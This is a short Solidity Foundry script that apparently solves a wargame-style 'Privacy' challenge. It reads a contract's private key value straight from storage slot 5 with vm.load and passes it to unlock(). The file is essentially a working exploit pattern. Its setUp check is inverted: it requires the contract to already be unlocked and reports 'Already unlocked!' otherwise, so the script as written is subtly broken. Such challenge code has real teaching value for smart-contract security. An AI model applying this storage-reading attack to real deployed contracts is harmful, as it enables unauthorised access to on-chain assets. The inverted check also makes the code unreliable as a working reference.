// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyScript is Script {
    Privacy public privacy;

    function setUp() public {
        privacy = Privacy(vm.envAddress("TARGET_CONTRACT_ADDRESS"));
        require(privacy.locked() == false, "Already unlocked!");
    }

    function run() public {
        vm.startBroadcast();

        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));

        privacy.unlock(bytes16(key));

        assert(privacy.locked() == false);

        vm.stopBroadcast();
    }
}
